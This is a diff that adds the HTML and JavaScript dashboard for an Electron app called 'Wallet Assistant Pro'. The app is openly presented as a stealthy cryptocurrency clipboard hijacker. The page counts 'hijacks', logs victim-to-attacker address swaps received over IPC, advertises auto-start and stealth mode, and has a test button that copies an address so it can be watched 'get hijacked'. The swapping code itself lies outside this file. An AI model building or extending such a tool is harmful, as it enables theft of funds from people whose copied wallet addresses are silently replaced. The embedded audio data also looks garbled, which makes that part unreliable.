@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Wallet Assistant Pro</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+        body { 
+            font-family: 'Orbitron', monospace; 
+            background: linear-gradient(45deg, #1a1a2e, #16213e, #0f3460);
+            color: #00ff88; 
+            margin: 0; 
+            height: 100vh; 
+            overflow: hidden;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+        .container { 
+            text-align: center; 
+            padding: 40px; 
+            max-width: 800px;
+            margin: auto;
+        }
+        .title { 
+            font-size: 36px; 
+            font-weight: 900; 
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px #00ff88;
+        }
+        .stats { 
+            display: flex; 
+            justify-content: space-around; 
+            margin: 30px 0;
+        }
+        .stat { 
+            background: rgba(0,255,136,0.1); 
+            padding: 20px; 
+            border-radius: 15px; 
+            border: 2px solid #00ff88;
+            min-width: 150px;
+        }
+        .count { 
+            font-size: 48px; 
+            font-weight: 900; 
+            color: #ff4444;
+            text-shadow: 0 0 10px #ff4444;
+        }
+        .log { 
+            background: rgba(0,0,0,0.7); 
+            padding: 20px; 
+            border-radius: 10px; 
+            height: 250px; 
+            overflow-y: auto; 
+            font-size: 12px;
+            border: 1px solid #00ff88;
+            margin-top: 20px;
+        }
+        button { 
+            background: linear-gradient(45deg, #ff4444, #ff6666); 
+            border: none; 
+            color: white; 
+            padding: 15px 30px; 
+            border-radius: 25px; 
+            font-size: 16px; 
+            font-weight: bold;
+            cursor: pointer; 
+            margin: 10px; 
+            box-shadow: 0 5px 15px rgba(255,68,68,0.4);
+            transition: all 0.3s;
+        }
+        button:hover { transform: scale(1.05); box-shadow: 0 8px 25px rgba(255,68,68,0.6); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="title">💰 WALLET ASSISTANT PRO v3.1</div>
+        <div id="status" style="font-size: 24px; margin-bottom: 20px;">🟢 STEALTH MODE ACTIVE</div>
+        
+        <div class="stats">
+            <div class="stat">
+                <div>Hijacks</div>
+                <div class="count" id="hijacks">0</div>
+            </div>
+            <div class="stat">
+                <div>Status</div>
+                <div id="status2">MONITORING</div>
+            </div>
+            <div class="stat">
+                <div>Stealth</div>
+                <div>🔒 ON</div>
+            </div>
+        </div>
+        
+        <button onclick="toggleMonitor()">⏸️ PAUSE</button>
+        <button onclick="showStats()">📊 STATS</button>
+        <button onclick="openLogs()">📋 LOGS</button>
+        <button onclick="testHijack()">🧪 TEST</button>
+        
+        <div class="log" id="logBox">
+            Initializing stealth monitoring...<br>
+            Auto-start enabled ✓<br>
+            Ready to hijack wallets...
+        </div>
+    </div>
+
+    <script>
+        const { ipcRenderer, shell } = require('electron');
+        let paused = false;
+        
+        ipcRenderer.on('hijack-event', (e, data) => {
+            if (!paused) {
+                document.getElementById('hijacks').textContent = data.count;
+                addLog(`💰 #${data.count}: ${data.victim} → ${data.attacker}`);
+                playSound();
+            }
+        });
+        
+        function addLog(text) {
+            const log = document.getElementById('logBox');
+            log.innerHTML += text + '<br>';
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        function toggleMonitor() {
+            paused = !paused;
+            document.getElementById('status').textContent = paused ? '🟡 PAUSED' : '🟢 STEALTH MODE ACTIVE';
+            document.getElementById('status2').textContent = paused ? 'PAUSED' : 'MONITORING';
+        }
+        
+        function showStats() {
+            ipcRenderer.send('stats');
+        }
+        
+        function openLogs() {
+            ipcRenderer.send('open-logs');
+        }
+        
+        function testHijack() {
+            const testAddr = '0x1234567890abcdef1234567890abcdef12345678';
+            require('electron').clipboard.writeText(testAddr);
+            addLog('🧪 Test address copied - watch it get hijacked!');
+        }
+        
+        function playSound() {
+            const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVKMbF1fdJivrJBhNjV');
+            audio.play();
+        }
+    </script>
+</body>
+</html>
